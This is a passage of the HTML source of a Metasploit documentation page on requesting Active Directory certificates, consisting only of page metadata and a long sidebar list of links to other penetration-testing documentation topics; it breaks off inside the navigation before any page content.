<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><link rel="shortcut icon" href="/assets/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/assets/css/just-the-docs-default.css"> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-4622520-7"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-4622520-7', { 'anonymize_ip': true }); </script> <script type="text/javascript" src="/assets/js/vendor/lunr.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mermaid@10.8.0/dist/mermaid.min.js"></script> <script type="text/javascript" src="/assets/js/just-the-docs.js"></script><meta name="viewport" content="width=device-width, initial-scale=1"><title>Request certificates | Metasploit Documentation Penetration Testing Software, Pen Testing Security</title><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Request certificates" /><meta property="og:locale" content="en_US" /><meta name="description" content="View Metasploit Framework Documentation" /><meta property="og:description" content="View Metasploit Framework Documentation" /><link rel="canonical" href="https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/icpr_cert.html" /><meta property="og:url" content="https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/icpr_cert.html" /><meta property="og:site_name" content="Metasploit Documentation Penetration Testing Software, Pen Testing Security" /><meta property="og:type" content="website" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Request certificates" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"WebPage","description":"View Metasploit Framework Documentation","headline":"Request certificates","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://rapid7.github.io/metasploit-framework/assets/images/favicon.png"}},"url":"https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/icpr_cert.html"}</script><body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"><title>Link</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"><title>Search</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"><title>Menu</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"><title>Expand</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"><polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"><title>Document</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <script type="text/javascript" src="/assets/js/toggle_init.js"></script><div class="side-bar"><div class="site-header"> <a href="/" class="site-title lh-tight"><img src="/assets/images/metasploit-logo-dark-external-use.svg" alt="Metasploit Logo" class="title-logo" /> </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a></div><nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"><ul class="nav-list"><li class="nav-list-item active"><a href="/" class="nav-list-link">Home</a><li class="nav-list-item active"><a href="/docs/code-of-conduct.html" class="nav-list-link">Code Of Conduct</a><li class="nav-list-item active"><a href="/docs/modules.html" class="nav-list-link">Modules</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/" class="nav-list-link active">Pentesting</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-setting-module-options.html" class="nav-list-link">Setting Module Options</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html" class="nav-list-link">Upgrading Shells to Meterpreter</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-post-gather-modules.html" class="nav-list-link">Post Gather Modules</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-http.html" class="nav-list-link">HTTP + HTTPS</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-kubernetes.html" class="nav-list-link">Kubernetes</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-mysql.html" class="nav-list-link">MySQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-postgresql.html" class="nav-list-link">PostgreSQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-smb.html" class="nav-list-link">SMB</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-ssh.html" class="nav-list-link">SSH</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-winrm.html" class="nav-list-link">WinRM</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-mssql.html" class="nav-list-link">MSSQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-ldap.html" class="nav-list-link">LDAP</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/" class="nav-list-link active">Active Directory</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/ad-certificates/" class="nav-list-link active">AD CS</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/overview.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html" class="nav-list-link">Attacking AD CS ESC Vulnerabilities Using Metasploit</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/ldap_esc_vulnerable_cert_finder.html" class="nav-list-link">Vulnerable cert finder</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/ad_cs_cert_template.html" class="nav-list-link">Manage certificate templates</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/icpr_cert.html" class="nav-list-link active">Request certificates</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/kerberos/" class="nav-list-link">Kerberos</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/overview.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/service_authentication.html" class="nav-list-link">Authenticating to SMB/WinRM/etc</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/kerberos_login.html" class="nav-list-link">Kerberos login enumeration and bruteforcing</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/get_ticket.html" class="nav-list-link">Get Ticket granting tickets and service tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/ticket_converter.html" class="nav-list-link">Converting kirbi and ccache files</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/forge_ticket.html" class="nav-list-link">Forging tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/inspect_ticket.html" class="nav-list-link">Inspecting tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/kerberoasting.html" class="nav-list-link">Kerberoasting</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/keytab.html" class="nav-list-link">Keytab support and decrypting wireshark traffic</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/rbcd.html" class="nav-list-link">Resource-based constrained delegation (RBCD)</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/unconstrained_delegation.html" class="nav-list-link">Unconstrained delegation</a></ul></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/" class="nav-list-link">Using Metasploit</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/getting-started/" class="nav-list-link">Getting Started</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/getting-started/nightly-installers.html" class="nav-list-link">Nightly Installers</a><li class="nav-list-item active"><a href="/docs/using-metasploit/getting-started/reporting-a-bug.html" class="nav-list-link">Reporting a Bug</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/basics/" class="nav-list-link">Basics</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/using-metasploit.html" class="nav-list-link">Running modules</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html" class="nav-list-link">How to use a Metasploit module appropriately</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-payloads-work.html" class="nav-list-link">How payloads work</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/module-documentation.html" class="nav-list-link">Module Documentation</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html" class="nav-list-link">How to use a reverse shell in Metasploit</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-msfvenom.html" class="nav-list-link">How to use msfvenom</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/managing-sessions.html" class="nav-list-link">Managing Sessions</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/intermediate/" class="nav-list-link">Intermediate</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/metasploit-database-support.html" class="nav-list-link">Database Support</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/evading-anti-virus.html" class="nav-list-link">Evading Anti Virus</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/exploit-ranking.html" class="nav-list-link">Exploit Ranking</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/hashes-and-password-cracking.html" class="nav-list-link">Hashes and Password Cracking</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/how-to-use-plugins.html" class="nav-list-link">Metasploit Plugins</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/payload-uuid.html" class="nav-list-link">Payload UUID</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/pivoting-in-metasploit.html" class="nav-list-link">Pivoting in Metasploit</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/running-private-modules.html" class="nav-list-link">Running Private Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/" class="nav-list-link">Advanced</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/how-to-configure-dns.html" class="nav-list-link">How to Configure DNS</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/metasploit-web-service.html" class="nav-list-link">Metasploit Web Service</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/meterpreter/" class="nav-list-link">Meterpreter</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html" class="nav-list-link">Configuration</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html" class="nav-list-link">Debugging Dead Meterpreter Sessions</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-debugging-meterpreter-sessions.html" class="nav-list-link">Debugging Meterpreter Sessions</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html" class="nav-list-link">ExecuteBof Command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-http-communication.html" class="nav-list-link">HTTP Communication</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/how-to-get-started-with-writing-a-meterpreter-script.html" class="nav-list-link">How to get started with writing a Meterpreter script</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html" class="nav-list-link">Paranoid Mode</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/powershell-extension.html" class="nav-list-link">Powershell Extension</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/python-extension.html" class="nav-list-link">Python Extension</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-reg-command.html" class="nav-list-link">Reg Command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-reliable-network-communication.html" class="nav-list-link">Reliable Network Communication</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html" class="nav-list-link">Sleep Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html" class="nav-list-link">Stageless Mode</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html" class="nav-list-link">The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html" class="nav-list-link">Timeout Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html" class="nav-list-link">Transport Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-unicode-support.html" class="nav-list-link">Unicode Support</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-wishlist.html" class="nav-list-link">Wishlist</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/RPC/" class="nav-list-link">RPC</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-json-rpc.html" class="nav-list-link">How to use Metasploit JSON RPC</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-messagepack-rpc.html" class="nav-list-link">How to use Metasploit Messagepack RPC</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/other/" class="nav-list-link">Other</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/other/how-to-use-metasploit-with-ngrok.html" class="nav-list-link">How to use Metasploit with ngrok</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/how-to-use-the-favorite-command.html" class="nav-list-link">How to use the Favorite command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/information-about-unmet-browser-exploit-requirements.html" class="nav-list-link">Information About Unmet Browser Exploit Requirements</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/other/oracle-support/" class="nav-list-link">Oracle Support</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html" class="nav-list-link">How to get Oracle Support working with Kali Linux</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/oracle-support/oracle-usage.html" class="nav-list-link">Oracle Usage</a></ul><li class="nav-list-item active"><a href="/docs/using-metasploit/other/why-cve-is-not-available.html" class="nav-list-link">Why CVE is not available</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/" class="nav-list-link">Development</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/get-started/" class="nav-list-link">Get Started</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/get-started/contributing-to-metasploit.html" class="nav-list-link">Contributing to Metasploit</a><li class="nav-list-item active"><a href="/docs/development/get-started/creating-your-first-pr.html" class="nav-list-link">Creating Your First PR</a><li class="nav-list-item active"><a href="/docs/development/get-started/setting-up-a-metasploit-development-environment.html" class="nav-list-link">Setting Up a Metasploit Development Environment</a><li class="nav-list-item active"><a href="/docs/development/get-started/sanitizing-pcaps.html" class="nav-list-link">Sanitizing PCAPs</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/get-started/git/" class="nav-list-link">Git</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/get-started/git/git-reference-sites.html" class="nav-list-link">Git Reference Sites</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/git-cheatsheet.html" class="nav-list-link">Git cheatsheet</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html" class="nav-list-link">Keeping in sync with rapid7 master</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/remote-branch-pruning.html" class="nav-list-link">Remote Branch Pruning</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/using-git.html" class="nav-list-link">Using Git</a></ul><li class="nav-list-item active"><a href="/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html" class="nav-list-link">Navigating the codebase</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/" class="nav-list-link">Developing Modules</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/guides/" class="nav-list-link">Guides</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/guides/scanners/" class="nav-list-link">Scanners</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html" class="nav-list-link">Writing a HTTP LoginScanner</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html" class="nav-list-link">Writing an FTP LoginScanner</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html" class="nav-list-link">How to check Microsoft patch levels for your exploit</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html" class="nav-list-link">How to use Fetch Payloads</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-use-command-stagers.html" class="nav-list-link">How to use command stagers</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-check-method.html" class="nav-list-link">How to write a check method</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-cmd-injection-module.html" class="nav-list-link">How to write a cmd injection module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-browser-exploit-using-httpserver.html" class="nav-list-link">Writing a browser exploit</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-get-started-with-writing-a-post-module.html" class="nav-list-link">Writing a post module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html" class="nav-list-link">Writing an auxiliary module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/get-started-writing-an-exploit.html" class="nav-list-link">Writing an exploit</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/external-modules/" class="nav-list-link">External Modules</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-golang-modules.html" class="nav-list-link">Writing GoLang Modules</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-python-modules.html" class="nav-list-link">Writing Python Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/module-metadata/" class="nav-list-link">Module metadata</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html" class="nav-list-link">Definition of Module Reliability Side Effects and Stability</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html" class="nav-list-link">How to use datastore options</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/module-reference-identifiers.html" class="nav-list-link">Module Reference Identifiers</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/" class="nav-list-link">Libraries</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/api.html" class="nav-list-link">API</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-msf-auxiliary-authbrute-to-write-a-bruteforcer.html" class="nav-list-link">AuthBrute</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-cleanup-after-module-execution.html" class="nav-list-link">Cleanup</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/c/" class="nav-list-link">Compiling C</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html" class="nav-list-link">Base64 Support</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-decrypt-rc4-with-metasploit-framework-compiler.html" class="nav-list-link">RC4 Support</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-xor-with-metasploit-framework-compiler.html" class="nav-list-link">XOR Support</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/deserialization/" class="nav-list-link">Deserialization</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html" class="nav-list-link">Dot Net Deserialization</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html" class="nav-list-link">Java Deserialization</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html" class="nav-list-link">Fail_with</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-fileformat-mixin-to-create-a-file-format-exploit.html" class="nav-list-link">Fileformat</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-git-mixin-to-write-an-exploit-module.html" class="nav-list-link">Git Mixin</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/http/" class="nav-list-link">HTTP</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-write-a-browser-exploit-using-browserexploitserver.html" class="nav-list-link">BrowserExploitServer</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html" class="nav-list-link">How to Send an HTTP Request Using HttpClient</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html" class="nav-list-link">How to parse an HTTP response</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html" class="nav-list-link">How to send an HTTP request using Rex Proto Http Client</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-write-a-module-using-httpserver-and-httpclient.html" class="nav-list-link">How to write a module using HttpServer and HttpClient</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html" class="nav-list-link">Logging</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/obfuscation/" class="nav-list-link">Obfuscation</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html" class="nav-list-link">C Obfuscation</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html" class="nav-list-link">JavaScript Obfuscation</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-phpexe-to-exploit-an-arbitrary-file-upload-bug.html" class="nav-list-link">PhpExe</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/post-mixins.html" class="nav-list-link">PostMixins</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-powershell-in-an-exploit.html" class="nav-list-link">Powershell</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-railgun-for-windows-post-exploitation.html" class="nav-list-link">Railgun</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/using-reflectivedll-injection.html" class="nav-list-link">ReflectiveDLL Injection</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-do-reporting-or-store-data-in-module-development.html" class="nav-list-link">Reporting and Storing Data</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-seh-mixin-to-exploit-an-exception-handler.html" class="nav-list-link">SEH Exploitation</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/smb_library/" class="nav-list-link">SMB Library</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/smb_library/guidelines-for-writing-modules-with-smb.html" class="nav-list-link">Guidelines for Writing Modules with SMB</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/smb_library/what-my-rex-proto-smb-error-means.html" class="nav-list-link">What my Rex Proto SMB Error means</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/sql-injection-libraries.html" class="nav-list-link">SQL Injection</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html" class="nav-list-link">TCP</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-wbemexec-for-a-write-privilege-attack-on-windows.html" class="nav-list-link">WbemExec</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-zip-files-with-msf-util-exe-to_zip.html" class="nav-list-link">Zip</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/google-summer-of-code/" class="nav-list-link">Google Summer of Code</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-mentor-organization-application.html" class="nav-list-link">2017 Mentor Organization Application</a><li class="nav-list-item active"><a 